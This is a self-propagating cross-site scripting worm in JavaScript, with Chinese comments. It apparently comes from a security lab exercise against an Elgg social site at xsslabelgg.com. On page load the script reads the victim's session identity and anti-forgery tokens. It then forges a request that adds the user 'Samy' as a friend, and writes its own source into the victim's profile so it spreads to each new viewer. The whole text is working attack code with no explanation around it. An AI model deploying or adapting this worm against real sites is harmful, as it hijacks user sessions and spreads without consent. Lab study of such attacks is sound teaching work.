<script id="worm">
window.onload = function(){
    // 获取用户信息和安全令牌
    var userName = elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid; 
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    
    // 获取Samy的guid
    var samyGuid = 47; // Samy的用户ID
    
    // 如果当前用户不是Samy
    if(elgg.session.user.guid != samyGuid) {
        // 准备添加好友的请求
        var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=" + samyGuid + ts + token;
        
        // 发送添加好友请求
        var Ajax = new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
        
        // 获取蠕虫代码
        var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
        var jsCode = document.getElementById("worm").innerHTML;
        var tailTag = "</" + "script>";
        var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
        
        // 准备个人资料更新内容
        var content = "name=" + userName + "&description=" + wormCode + 
                     "&accesslevel[description]=2" + guid + ts + token;
                     
        // 发送更新个人资料请求     
        var Ajax2 = new XMLHttpRequest();
        Ajax2.open("POST","http://www.xsslabelgg.com/action/profile/edit", true);
        Ajax2.setRequestHeader("Content-Type",
                             "application/x-www-form-urlencoded");
        Ajax2.send(content);
    }
}
</script>
